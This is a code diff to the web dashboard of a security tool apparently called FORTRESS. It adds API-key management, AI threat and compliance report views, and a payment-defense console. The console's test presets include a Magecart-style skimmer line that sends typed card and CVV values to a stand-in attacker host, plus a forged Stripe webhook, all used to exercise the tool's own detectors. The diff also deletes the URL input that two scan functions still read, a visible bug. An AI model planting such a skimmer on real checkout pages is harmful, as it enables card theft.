@@ -342,9 +342,10 @@ router.get("/", (req, res) => {
     </div>
     <div class="badge-group">
       <div class="stealth-badge">🔒 ZERO SECRETS LEAK POLICY</div>
+      <button class="preset-btn" style="border-color: rgba(255, 0, 85, 0.4); color: #ff0055; padding: 6px 14px;" onclick="logoutVault()">🔒 LOCK VAULT</button>
       <div class="status-badge">
         <div class="status-pulse"></div>
-        ARMED • GEMINI 3.8 FLASH HIGH
+        ARMED • GEMINI 2.0 FLASH
       </div>
     </div>
   </div>
@@ -384,6 +385,9 @@ router.get("/", (req, res) => {
         <button class="tab-btn" onclick="setTab('patch')">7. 🧬 Virtual Patches</button>
         <button class="tab-btn" onclick="setTab('threat')">8. 🧠 Threat Profiler</button>
         <button class="tab-btn" onclick="setTab('signer')">9. 🛡️ Tamper SDK</button>
+        <button class="tab-btn" onclick="setTab('vault')">10. 🔑 Vault Keymaster</button>
+        <button class="tab-btn" onclick="setTab('reports')">11. 📊 AI Threat Reports</button>
+        <button class="tab-btn" onclick="setTab('payment')">12. 💳 Payment Fortress</button>
       </div>
 
       <!-- Tab 1: Cloud Defender -->
@@ -432,8 +436,8 @@ router.get("/", (req, res) => {
       <!-- Tab 4: URL Weakness Scanner -->
       <div id="tab-url" style="display: none;">
         <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 8px;">Target Web URL:</div>
-        <input type="text" id="target-url" value="https://google.com" placeholder="https://example.com" />
         <button class="btn" onclick="runUrlScan()">🔍 AUDIT WEB WEAKNESSES</button>
+        <button class="btn btn-secondary" style="background: rgba(0, 240, 255, 0.2); border: 1px solid var(--primary); color: var(--primary); margin-top: 8px;" onclick="runZeroVulnAudit()">🏆 CERTIFY ZERO-VULNERABILITY POSTURE</button>
       </div>
 
       <!-- Tab 5: Canary Honeytokens -->
@@ -502,6 +506,110 @@ router.get("/", (req, res) => {
         <button class="btn btn-danger" style="margin-top: 8px;" onclick="simulateTamperTest()">🦹 SIMULATE TAMPERED PRICE ATTACK ($1200 -> $1)</button>
       </div>
 
+      <!-- Tab 10: Vault Keymaster -->
+      <div id="tab-vault" style="display: none;">
+        <div style="font-size: 13px; color: var(--text); margin-bottom: 8px; font-weight: 600;">
+          🔑 Vault Access Keymaster & Key Dispenser:
+        </div>
+        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">
+          Anyone wanting to use your API must obtain an authorized Vault Key from you. Issue unique keys below, set request quotas, or revoke them at any time.
+        </div>
+
+        <div style="background: rgba(0,0,0,0.3); border: 1px solid var(--card-border); border-radius: 8px; padding: 14px; margin-bottom: 14px;">
+          <div style="font-size: 12px; font-weight: 700; color: var(--primary); margin-bottom: 10px; font-family: 'JetBrains Mono';">
+            + ISSUE NEW CLIENT KEY
+          </div>
+          <div style="display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 10px;">
+            <input type="text" id="new-key-name" placeholder="Client / Friend Name (e.g. Alex)" style="flex: 2; min-width: 140px;" />
+            <input type="number" id="new-key-quota" placeholder="Quota" value="1000" style="flex: 1; min-width: 90px;" />
+            <select id="new-key-role" style="flex: 1; min-width: 110px;">
+              <option value="CLIENT">Client</option>
+              <option value="VIP_PARTNER">VIP Partner</option>
+            </select>
+          </div>
+          <button class="btn" onclick="issueVaultKey()">⚡ ISSUE & COPY VAULT KEY</button>
+        </div>
+
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+          <span style="font-size: 12px; font-family: 'JetBrains Mono'; color: var(--text-muted);">ACTIVE CLIENT KEYS:</span>
+          <button class="preset-btn" onclick="loadVaultKeys()" style="padding: 4px 8px; font-size: 10px;">🔄 Refresh List</button>
+        </div>
+        <div id="vault-keys-list" style="font-family: 'JetBrains Mono'; font-size: 11px; max-height: 200px; overflow-y: auto; display: flex; flex-direction: column; gap: 6px;">
+          <div style="color: var(--text-muted); padding: 8px;">Click 'Refresh List' to load keys...</div>
+        </div>
+      </div>
+
+      <!-- Tab 11: AI Threat Intelligence & Scheduled Reports -->
+      <div id="tab-reports" style="display: none;">
+        <div style="font-size: 13px; color: var(--text); margin-bottom: 8px; font-weight: 600;">
+          📊 Autonomous AI Threat Intelligence & Specialized Compliance Audits:
+        </div>
+        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">
+          FORTRESS synthesizes all attacks repelled, honeypot events, and attacker TTPs into CISO-grade intelligence reports and international regulatory compliance audits.
+        </div>
+
+        <div style="display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 14px;">
+          <button class="preset-btn" onclick="fetchLatestReport()" style="border-color: var(--primary); color: var(--primary);">📋 CISO Threat Digest</button>
+          <button class="preset-btn" onclick="fetchPciDssReport()" style="border-color: var(--success); color: var(--success);">💳 PCI-DSS v4.0 Audit</button>
+          <button class="preset-btn" onclick="fetchOwaspReport()" style="border-color: var(--warning); color: var(--warning);">🛡️ OWASP API Top 10</button>
+          <button class="preset-btn" onclick="fetchThreatActorsReport()" style="border-color: var(--accent); color: var(--accent);">🎯 MITRE ATT&CK Dossier</button>
+        </div>
+
+        <div style="background: rgba(0,0,0,0.3); border: 1px solid var(--card-border); border-radius: 8px; padding: 14px; margin-bottom: 14px;">
+          <div style="font-size: 12px; font-weight: 700; color: var(--primary); margin-bottom: 10px; font-family: 'JetBrains Mono';">
+            ⚙️ AUTOMATED REPORTING SCHEDULE
+          </div>
+          <div style="display: flex; gap: 10px; flex-wrap: wrap; align-items: center; margin-bottom: 10px;">
+            <select id="report-schedule-interval" style="flex: 2; min-width: 180px;">
+              <option value="1">Every 1 Hour (Real-Time Vigilance)</option>
+              <option value="6">Every 6 Hours</option>
+              <option value="12">Every 12 Hours</option>
+              <option value="24" selected>Every 24 Hours (Daily Executive CISO Digest)</option>
+            </select>
+            <button class="preset-btn" onclick="updateReportSchedule()">💾 Save Schedule</button>
+            <button class="btn" style="flex: 1; min-width: 200px;" onclick="generateAiReportNow()">🤖 GENERATE AI REPORT NOW</button>
+          </div>
+          <div style="font-size: 11px; color: #64748b; font-family: 'JetBrains Mono';">
+            Dispatches live alerts to Telegram, Slack, and Discord when configured in your environment.
+          </div>
+        </div>
+
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+          <span style="font-size: 12px; font-family: 'JetBrains Mono'; color: var(--text-muted);" id="report-panel-label">ACTIVE INTELLIGENCE REPORT:</span>
+          <button class="preset-btn" onclick="fetchLatestReport()" style="padding: 4px 8px; font-size: 10px;">🔄 Reload Current</button>
+        </div>
+        <div id="ai-report-display" style="background: rgba(0,0,0,0.4); border: 1px solid var(--card-border); border-radius: 8px; padding: 14px; font-family: 'JetBrains Mono'; font-size: 11px; max-height: 280px; overflow-y: auto;">
+          <div style="color: var(--text-muted);">Select a report above or click 'Generate AI Report Now' to synthesize...</div>
+        </div>
+      </div>
+
+      <!-- Tab 12: Payment Gateway & Financial Fortress -->
+      <div id="tab-payment" style="display: none;">
+        <div style="font-size: 13px; color: var(--text); margin-bottom: 8px; font-weight: 600;">
+          💳 Enterprise Payment & Checkout Defense Console:
+        </div>
+        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">
+          Protects financial flows against Luhn test cards, automated carding bot velocity spikes, fractional-cent (salami slicing) rounding attacks, forged webhook replays, and Magecart form-jackers.
+        </div>
+
+        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 8px;">Quick Financial Exploit Presets:</div>
+        <div class="btn-group">
+          <button class="preset-btn" onclick="loadPaymentPreset('carding_bot')">💳 Carding Bot Velocity Spike</button>
+          <button class="preset-btn" onclick="loadPaymentPreset('fractional_cent')">🪙 Fractional Cent ($0.0001)</button>
+          <button class="preset-btn" onclick="loadPaymentPreset('currency_switch')">💵 Currency Arbitrage (JPY -> USD)</button>
+          <button class="preset-btn" onclick="loadPaymentPreset('magecart')">🕵️ Magecart Web-Skimmer Code</button>
+          <button class="preset-btn" onclick="loadPaymentPreset('fake_webhook')">🪝 Forged Unsigned Stripe Webhook</button>
+        </div>
+
+        <textarea id="payment-payload" rows="6" placeholder="Enter transaction JSON or JavaScript to audit..."></textarea>
+        
+        <div class="btn-group">
+          <button class="btn" onclick="runPaymentAudit()">⚡ RUN FINANCIAL AUDIT</button>
+          <button class="btn btn-secondary" onclick="runMagecartAudit()" style="background: rgba(255,184,0,0.2); border: 1px solid var(--warning); color: var(--warning);">🕵️ AUDIT FOR MAGECART SKIMMER</button>
+          <button class="preset-btn" onclick="loadPaymentTelemetry()">📊 Payment Telemetry</button>
+        </div>
+      </div>
+
       <div style="margin-top: 18px; font-size: 12px; font-family: 'JetBrains Mono'; color: var(--primary);">
         DEFENSE VERDICT:
       </div>
@@ -536,6 +644,12 @@ router.get("/", (req, res) => {
       document.getElementById('tab-patch').style.display = tab === 'patch' ? 'block' : 'none';
       document.getElementById('tab-threat').style.display = tab === 'threat' ? 'block' : 'none';
       document.getElementById('tab-signer').style.display = tab === 'signer' ? 'block' : 'none';
+      document.getElementById('tab-vault').style.display = tab === 'vault' ? 'block' : 'none';
+      document.getElementById('tab-reports').style.display = tab === 'reports' ? 'block' : 'none';
+      document.getElementById('tab-payment').style.display = tab === 'payment' ? 'block' : 'none';
+      if (tab === 'vault') loadVaultKeys();
+      if (tab === 'reports') fetchLatestReport();
+      if (tab === 'payment') loadPaymentPreset('carding_bot');
     }
 
     const presets = {
@@ -655,6 +769,23 @@ router.get("/", (req, res) => {
       try {
         const url = document.getElementById('target-url').value;
         const res = await fetch('/api/inspect-url', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ url })
+        });
+        const data = await res.json();
+        box.textContent = JSON.stringify(data, null, 2);
+      } catch (err) {
+        box.textContent = "Error: " + err.message;
+      }
+    }
+
+    async function runZeroVulnAudit() {
+      const box = document.getElementById('result-box');
+      box.textContent = "Executing 360-degree Zero-Vulnerability Compliance Audit on target URL...";
+      try {
+        const url = document.getElementById('target-url').value;
+        const res = await fetch('/api/inspect-url/zero-vuln', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ url })
@@ -866,6 +997,346 @@ router.get("/", (req, res) => {
           \`).join('');
         }
       } catch {}
+    }
+
+    async function loadVaultKeys() {
+      const listEl = document.getElementById('vault-keys-list');
+      try {
+        const res = await fetch('/api/vault/keys');
+        const data = await res.json();
+        if (!res.ok) {
+          listEl.innerHTML = \`<div style="color: var(--accent); padding: 8px;">⚠️ \${data.reason || 'Master Admin authentication required.'}</div>\`;
+          return;
+        }
+        if (!data.keys || data.keys.length === 0) {
+          listEl.innerHTML = \`<div style="color: var(--text-muted); padding: 8px;">No client keys issued yet. Generate one above!</div>\`;
+          return;
+        }
+        listEl.innerHTML = data.keys.map(k => \`
+          <div style="background: rgba(255,255,255,0.03); border: 1px solid \${k.status === 'ACTIVE' ? 'var(--card-border)' : 'rgba(255,0,85,0.3)'}; border-radius: 6px; padding: 10px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px;">
+            <div>
+              <div style="color: #fff; font-weight: 600;">\${k.name} <span style="font-size: 9px; padding: 2px 6px; border-radius: 4px; background: \${k.status === 'ACTIVE' ? 'rgba(0,255,136,0.15)' : 'rgba(255,0,85,0.15)'}; color: \${k.status === 'ACTIVE' ? 'var(--success)' : 'var(--accent)'}">\${k.status}</span></div>
+              <div style="color: var(--primary); font-size: 11px;">\${k.maskedKey}</div>
+              <div style="color: var(--text-muted); font-size: 10px;">Quota: \${k.usageCount} / \${k.quota} requests used</div>
+            </div>
+            \${k.status === 'ACTIVE' ? \`<button class="preset-btn" style="border-color: rgba(255,0,85,0.4); color: #ff0055;" onclick="revokeVaultKey('\${k.id}')">Revoke</button>\` : '<span style="color: #64748b; font-size: 10px;">Revoked</span>'}
+          </div>
+        \`).join('');
+      } catch (err) {
+        listEl.innerHTML = \`<div style="color: var(--accent); padding: 8px;">Error loading keys: \${err.message}</div>\`;
+      }
+    }
+
+    async function issueVaultKey() {
+      const name = document.getElementById('new-key-name').value.trim();
+      const quota = parseInt(document.getElementById('new-key-quota').value, 10) || 1000;
+      const role = document.getElementById('new-key-role').value;
+      const box = document.getElementById('result-box');
+
+      if (!name) {
+        alert("Please enter a recipient name (e.g. Alex).");
+        return;
+      }
+
+      box.textContent = "Generating new Vault Client Key...";
+      try {
+        const res = await fetch('/api/vault/keys', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ name, quota, role })
+        });
+        const data = await res.json();
+        box.textContent = JSON.stringify(data, null, 2);
+
+        if (res.ok && data.key_details) {
+          navigator.clipboard.writeText(data.key_details.key).catch(() => {});
+          alert(\`Vault Key created for \${name}!\\n\\nKey: \${data.key_details.key}\\n\\n(Copied to clipboard! Send this to them)\`);
+          document.getElementById('new-key-name').value = '';
+          loadVaultKeys();
+        }
+      } catch (err) {
+        box.textContent = "Error: " + err.message;
+      }
+    }
+
+    async function revokeVaultKey(id) {
+      if (!confirm("Are you sure you want to revoke this key? The recipient will be immediately blocked from using the API.")) return;
+      const box = document.getElementById('result-box');
+      box.textContent = \`Revoking key \${id}...\`;
+      try {
+        const res = await fetch(\`/api/vault/keys/\${id}\`, { method: 'DELETE' });
+        const data = await res.json();
+        box.textContent = JSON.stringify(data, null, 2);
+        loadVaultKeys();
+      } catch (err) {
+        box.textContent = "Error: " + err.message;
+      }
+    }
+
+    function logoutVault() {
+      document.cookie = "vault_token=; path=/; max-age=0;";
+      localStorage.removeItem("fortress_vault_token");
+      fetch('/api/vault/logout', { method: 'POST' }).finally(() => {
+        window.location.reload();
+      });
+    }
+
+    async function fetchLatestReport() {
+      const el = document.getElementById('ai-report-display');
+      const box = document.getElementById('result-box');
+      document.getElementById('report-panel-label').textContent = 'ACTIVE: CISO EXECUTIVE THREAT DIGEST';
+      el.innerHTML = '<div style="color: var(--primary);">Fetching latest AI Threat Digest...</div>';
+      try {
+        const res = await fetch('/api/reports/latest');
+        const data = await res.json();
+        box.textContent = JSON.stringify(data, null, 2);
+        if (!res.ok || !data.report) {
+          el.innerHTML = '<div style="color: var(--accent);">⚠️ Failed to load report. Ensure Master Pass is set.</div>';
+          return;
+        }
+        const r = data.report;
+        let html = '<div style="border-bottom: 1px solid var(--card-border); padding-bottom: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center;">';
+        html += '<span style="color: var(--primary); font-weight: 700;">DIGEST #' + r.report_id + ' (' + r.interval_hours + 'H WINDOW)</span>';
+        const badgeColor = r.threat_posture === 'FORTIFIED_AND_OPTIMAL' ? 'var(--success)' : 'var(--accent)';
+        const badgeBg = r.threat_posture === 'FORTIFIED_AND_OPTIMAL' ? 'rgba(0,255,136,0.2)' : 'rgba(255,0,85,0.2)';
+        html += '<span style="padding: 2px 8px; border-radius: 4px; font-size: 10px; background: ' + badgeBg + '; color: ' + badgeColor + '; font-weight: 700;">' + r.threat_posture + '</span></div>';
+        html += '<div style="color: #fff; line-height: 1.6; margin-bottom: 10px;">' + r.executive_summary + '</div>';
+        html += '<div style="color: var(--warning); font-weight: 600; margin-bottom: 4px;">TOP VECTORS IDENTIFIED:</div>';
+        html += '<ul style="padding-left: 18px; color: var(--text-muted); margin-bottom: 10px;">';
+        (r.attack_vector_breakdown || []).forEach(function(v) { html += '<li>' + v + '</li>'; });
+        html += '</ul>';
+        html += '<div style="color: var(--primary); font-weight: 600; margin-bottom: 4px;">CISO RECOMMENDATIONS:</div>';
+        html += '<ul style="padding-left: 18px; color: #a5b4fc;">';
+        (r.ciso_recommendations || []).forEach(function(rec) { html += '<li>' + rec + '</li>'; });
+        html += '</ul>';
+        html += '<div style="margin-top: 8px; font-size: 10px; color: #64748b;">Synthesized by ' + r.model_used + ' • ' + new Date(r.timestamp).toLocaleString() + '</div>';
+        el.innerHTML = html;
+      } catch (err) {
+        el.innerHTML = '<div style="color: var(--accent);">Error: ' + err.message + '</div>';
+      }
+    }
+
+    async function fetchPciDssReport() {
+      const el = document.getElementById('ai-report-display');
+      const box = document.getElementById('result-box');
+      document.getElementById('report-panel-label').textContent = 'ACTIVE: PCI-DSS v4.0 FINANCIAL PAYMENT AUDIT';
+      el.innerHTML = '<div style="color: var(--success);">Compiling PCI-DSS v4.0 Financial Payment Compliance Audit...</div>';
+      try {
+        const res = await fetch('/api/reports/pci-dss');
+        const data = await res.json();
+        box.textContent = JSON.stringify(data, null, 2);
+        if (!res.ok) {
+          el.innerHTML = '<div style="color: var(--accent);">⚠️ Failed to load PCI-DSS report: ' + (data.message || res.statusText) + '</div>';
+          return;
+        }
+        let html = '<div style="border-bottom: 1px solid var(--card-border); padding-bottom: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center;">';
+        html += '<span style="color: var(--success); font-weight: 700;">💳 ' + data.standard + '</span>';
+        html += '<span style="padding: 2px 8px; border-radius: 4px; font-size: 10px; background: rgba(0,255,136,0.2); color: var(--success); font-weight: 700;">' + data.overall_compliance_status + ' (' + data.audit_score + ')</span></div>';
+        html += '<div style="display: flex; flex-direction: column; gap: 8px; margin-top: 8px;">';
+        (data.verified_safeguards || []).forEach(function(s) {
+          html += '<div style="background: rgba(255,255,255,0.03); border: 1px solid var(--card-border); border-radius: 6px; padding: 8px;">';
+          html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px;">';
+          html += '<strong style="color: #fff;">' + s.requirement + '</strong>';
+          html += '<span style="font-size: 9px; padding: 2px 6px; border-radius: 4px; background: rgba(0,255,136,0.15); color: var(--success);">' + s.status + '</span>';
+          html += '</div>';
+          html += '<div style="font-size: 10px; color: var(--primary); margin-bottom: 2px;">🛡️ Shield: ' + s.shield + '</div>';
+          html += '<div style="font-size: 10px; color: var(--text-muted);">' + s.details + '</div>';
+          html += '</div>';
+        });
+        html += '</div>';
+        html += '<div style="margin-top: 10px; font-size: 10px; color: #64748b;">Audited at ' + new Date(data.timestamp).toLocaleString() + '</div>';
+        el.innerHTML = html;
+      } catch (err) {
+        el.innerHTML = '<div style="color: var(--accent);">Error: ' + err.message + '</div>';
+      }
+    }
+
+    async function fetchOwaspReport() {
+      const el = document.getElementById('ai-report-display');
+      const box = document.getElementById('result-box');
+      document.getElementById('report-panel-label').textContent = 'ACTIVE: OWASP API SECURITY TOP 10 SCORECARD (2023)';
+      el.innerHTML = '<div style="color: var(--warning);">Auditing OWASP API Security Top 10 posture...</div>';
+      try {
+        const res = await fetch('/api/reports/owasp');
+        const data = await res.json();
+        box.textContent = JSON.stringify(data, null, 2);
+        if (!res.ok) {
+          el.innerHTML = '<div style="color: var(--accent);">⚠️ Failed to load OWASP scorecard: ' + (data.message || res.statusText) + '</div>';
+          return;
+        }
+        let html = '<div style="border-bottom: 1px solid var(--card-border); padding-bottom: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center;">';
+        html += '<span style="color: var(--warning); font-weight: 700;">🛡️ ' + data.standard + '</span>';
+        html += '<span style="padding: 2px 8px; border-radius: 4px; font-size: 10px; background: rgba(255,184,0,0.2); color: var(--warning); font-weight: 700;">POSTURE GRADE: ' + data.posture_grade + '</span></div>';
+        html += '<div style="display: flex; flex-direction: column; gap: 8px; margin-top: 8px;">';
+        (data.top_10_matrix || []).forEach(function(m) {
+          html += '<div style="background: rgba(255,255,255,0.03); border: 1px solid var(--card-border); border-radius: 6px; padding: 8px;">';
+          html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px;">';
+          html += '<strong style="color: #fff;">[' + m.id + '] ' + m.name + '</strong>';
+          html += '<span style="font-size: 9px; padding: 2px 6px; border-radius: 4px; background: rgba(0,255,136,0.15); color: var(--success);">' + m.status + '</span>';
+          html += '</div>';
+          html += '<div style="font-size: 10px; color: var(--primary); margin-bottom: 2px;">⚡ Defense: ' + m.layer + '</div>';
+          html += '<div style="font-size: 10px; color: var(--text-muted);">' + m.defense_summary + '</div>';
+          html += '</div>';
+        });
+        html += '</div>';
+        html += '<div style="margin-top: 10px; font-size: 10px; color: #64748b;">Audited at ' + new Date(data.timestamp).toLocaleString() + '</div>';
+        el.innerHTML = html;
+      } catch (err) {
+        el.innerHTML = '<div style="color: var(--accent);">Error: ' + err.message + '</div>';
+      }
+    }
+
+    async function fetchThreatActorsReport() {
+      const el = document.getElementById('ai-report-display');
+      const box = document.getElementById('result-box');
+      document.getElementById('report-panel-label').textContent = 'ACTIVE: MITRE ATT&CK THREAT ACTOR RECON DOSSIER';
+      el.innerHTML = '<div style="color: var(--accent);">Compiling adversary profile & MITRE ATT&CK matrix...</div>';
+      try {
+        const res = await fetch('/api/reports/threat-actors');
+        const data = await res.json();
+        box.textContent = JSON.stringify(data, null, 2);
+        if (!res.ok) {
+          el.innerHTML = '<div style="color: var(--accent);">⚠️ Failed to load Threat Dossier: ' + (data.message || res.statusText) + '</div>';
+          return;
+        }
+        let html = '<div style="border-bottom: 1px solid var(--card-border); padding-bottom: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center;">';
+        html += '<span style="color: var(--accent); font-weight: 700;">🎯 MITRE ATT&CK RECON DOSSIER</span>';
+        html += '<span style="padding: 2px 8px; border-radius: 4px; font-size: 10px; background: rgba(255,0,85,0.2); color: var(--accent); font-weight: 700;">' + data.total_adversaries_profiled + ' ADVERSARIES TRACKED</span></div>';
+        html += '<div style="color: var(--warning); font-weight: 600; margin-bottom: 6px;">OBSERVED ADVERSARY TTPs (TACTICS & TECHNIQUES):</div>';
+        html += '<div style="display: flex; flex-direction: column; gap: 6px; margin-bottom: 10px;">';
+        (data.observed_mitre_ttps || []).forEach(function(t) {
+          html += '<div style="background: rgba(255,255,255,0.03); border: 1px solid var(--card-border); border-radius: 6px; padding: 8px;">';
+          html += '<div style="display: flex; justify-content: space-between; align-items: center;">';
+          html += '<strong style="color: #fff;">' + t.technique_id + ': ' + t.technique_name + '</strong>';
+          html += '<span style="font-size: 9px; padding: 2px 6px; border-radius: 4px; background: rgba(255,0,85,0.15); color: var(--accent);">' + t.hits + ' Intercepts</span>';
+          html += '</div>';
+          html += '<div style="font-size: 10px; color: var(--text-muted); margin-top: 2px;">Tactic: ' + t.tactic + ' | Neutralizer: ' + t.fortress_neutralizer + '</div>';
+          html += '</div>';
+        });
+        html += '</div>';
+        html += '<div style="color: var(--primary); font-weight: 600; margin-bottom: 4px;">HONEYTOKEN TRIPWIRE CASUALTIES: ' + (data.honeytoken_tripwire_casualties || []).length + '</div>';
+        html += '<div style="margin-top: 8px; font-size: 10px; color: #64748b;">Audited at ' + new Date(data.timestamp).toLocaleString() + '</div>';
+        el.innerHTML = html;
+      } catch (err) {
+        el.innerHTML = '<div style="color: var(--accent);">Error: ' + err.message + '</div>';
+      }
+    }
+
+    async function generateAiReportNow() {
+      const box = document.getElementById('result-box');
+      box.textContent = "Synthesizing live security intelligence with Google Gemini AI...";
+      try {
+        const res = await fetch('/api/reports/generate-now', { method: 'POST' });
+        const data = await res.json();
+        box.textContent = JSON.stringify(data, null, 2);
+        fetchLatestReport();
+      } catch (err) {
+        box.textContent = "Error: " + err.message;
+      }
+    }
+
+    async function updateReportSchedule() {
+      const intervalHours = parseInt(document.getElementById('report-schedule-interval').value, 10);
+      const box = document.getElementById('result-box');
+      box.textContent = "Updating AI Report interval to " + intervalHours + " hours...";
+      try {
+        const res = await fetch('/api/reports/schedule', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ intervalHours })
+        });
+        const data = await res.json();
+        box.textContent = JSON.stringify(data, null, 2);
+        alert("Schedule updated! FORTRESS will synthesize and dispatch AI reports every " + intervalHours + " hour(s).");
+      } catch (err) {
+        box.textContent = "Error: " + err.message;
+      }
+    }
+
+    const paymentPresets = {
+      carding_bot: {
+        cardNumber: "4111111111111111",
+        amount: 25.00,
+        currency: "USD",
+        cvv: "123",
+        orderId: "ORD-CARDING-TEST"
+      },
+      fractional_cent: {
+        amount: 0.0001,
+        currency: "USD",
+        productId: "prod_gold_99",
+        description: "Fractional Cent Salami Slicing Attack"
+      },
+      currency_switch: {
+        amount: 100,
+        currency: "RUB",
+        productId: "luxury_watch_1",
+        description: "Currency Arbitrage Switching Exploit"
+      },
+      magecart: "document.addEventListener('keypress', function(e) { if(e.target.name === 'card' || e.target.name === 'cvv') { navigator.sendBeacon('https://malicious-drop-server.org/collect', btoa(e.target.value)); } });",
+      fake_webhook: {
+        gateway: "stripe",
+        rawBody: '{"id":"evt_test_123","type":"payment_intent.succeeded","data":{"object":{"amount":120000}}}',
+        headers: { "x-attacker": "forged_request_without_secret" }
+      }
+    };
+
+    function loadPaymentPreset(key) {
+      const el = document.getElementById('payment-payload');
+      const val = paymentPresets[key];
+      el.value = typeof val === 'string' ? val : JSON.stringify(val, null, 2);
+    }
+
+    async function runPaymentAudit() {
+      const box = document.getElementById('result-box');
+      box.textContent = "Auditing transaction against Luhn, carding velocity, and precision checks...";
+      try {
+        const text = document.getElementById('payment-payload').value;
+        const body = JSON.parse(text);
+        let endpoint = '/api/payment/audit-transaction';
+        if (body.gateway && body.rawBody) {
+          endpoint = '/api/payment/verify-webhook';
+        }
+        const res = await fetch(endpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(body)
+        });
+        const data = await res.json();
+        box.textContent = JSON.stringify(data, null, 2);
+        fetchMetrics();
+      } catch (err) {
+        box.textContent = "Error: " + err.message;
+      }
+    }
+
+    async function runMagecartAudit() {
+      const box = document.getElementById('result-box');
+      box.textContent = "Analyzing script for Magecart web-skimmer and form-jacking indicators...";
+      try {
+        const scriptContent = document.getElementById('payment-payload').value;
+        const res = await fetch('/api/payment/audit-checkout-script', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ scriptContent })
+        });
+        const data = await res.json();
+        box.textContent = JSON.stringify(data, null, 2);
+      } catch (err) {
+        box.textContent = "Error: " + err.message;
+      }
+    }
+
+    async function loadPaymentTelemetry() {
+      const box = document.getElementById('result-box');
+      box.textContent = "Fetching real-time payment gateway defense telemetry...";
+      try {
+        const res = await fetch('/api/payment/telemetry');
+        const data = await res.json();
+        box.textContent = JSON.stringify(data, null, 2);
+      } catch (err) {
+        box.textContent = "Error: " + err.message;
+      }
     }
 
     setInterval(fetchMetrics, 3000);
